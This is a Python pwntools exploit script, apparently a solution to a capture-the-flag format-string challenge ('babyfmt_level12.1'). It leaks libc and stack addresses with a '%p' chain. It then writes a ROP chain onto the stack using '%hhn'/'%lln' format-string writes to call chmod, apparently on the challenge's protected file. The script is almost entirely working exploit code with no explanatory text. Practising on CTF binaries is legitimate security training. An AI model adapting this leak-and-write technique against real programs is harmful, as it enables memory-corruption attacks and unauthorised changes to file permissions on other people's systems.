from pwn import *
context(os='linux', arch='amd64',log_level='debug')
p=process("/challenge/babyfmt_level12.1")
puts=0x84420
chmod=0x10dd80
pop_rdi_ret=0x18c3
pop_rsi_ret_libc=0x2601f
pop_rdi_ret_libc=0x23b6a 
leave_ret=0x1850
stdin=0x1721f

exit_got=0x3FD0
puts_got=0x3F88
puts_plt=0x1100
func=0x14D3

def payload1(c1,c2,offset):
    payload=b'aa'+b'%p'*c1+b'END'
    c=0
    p.send(payload)
    p.recvuntil("aa",drop=True)
    libc=0
    stack_addr=0
    x=p.recvuntil("END",drop=True)
    for i in range(len(x)):
        if (i<len(x)-1 and x[i]==ord('0') and x[i+1]==ord('x')) or (i<len(x)-2 and x[i]==ord('n') and x[i+1]==ord('i') and x[i+2]==ord('l')):
            c+=1
            if c==c2:
                stack_addr=int(x[i+2:i+14],16)-offset
            elif c==c1:
                libc=int(x[i+2:i+14],16)-0x24083
                return libc,stack_addr


    
libc,stack_addr=payload1(163,19,560)     
assert(libc%0x1000==0)
chmod+=libc
stdin+=libc
print("[LEAK]:libc=",hex(libc))
print("[LEAK]:stack_addr=",hex(stack_addr))

def upd(s):
    res=b''
    i=0
    cnt=0
    while i<len(s):
        if s[i]==ord('%') and s[i+3]==ord('$'):
            res+=b'%'
            i+=3
            cnt+=3
        elif s[i]==ord('%') and s[i+4]==ord('$'):
            res+=b'%'
            i+=4
            cnt+=4
        else:
            res+=s[i:i+1]
        i+=1
        if s[i-1]==ord('n') and s[i:].find(b'$')==-1 and cnt:
            res+=b'a'*cnt
            cnt=0
    print(res)
    return res

def build(ls,offset,written):
    st=[]
    for addr,val in ls:
        if val==4:
            st.append((val,addr,1))
        else:   
            for i in range(8):
                st.append((val%256,addr,0))
                val//=256
                addr+=1
    st.sort()
    c=113
    payload=b'a'*(256-c-written)+b'%c'*c
    lstval=0
    for val,addr,p in st:
        payload+=b'a'*(val-lstval)
        if p==1:
            payload+=b'%lln'
        else:
            payload+=b'%hhn'
        lstval=val
    payload+=b'a'*((c-25)*8-len(payload))
    for val,addr,p in st:
        payload+=p64(addr)
    assert(len(payload)<975)
    print(len(payload))
    print(payload)
    return payload
    

payload2=b'a'*3+build([(stack_addr,pop_rdi_ret_libc+libc), (stack_addr+8,stdin),(stack_addr+16,pop_rsi_ret_libc+libc),(stack_addr+24,4),(stack_addr+32,chmod)],26,48)
p.send(payload2)
print(p.recvall())
p.interactive()

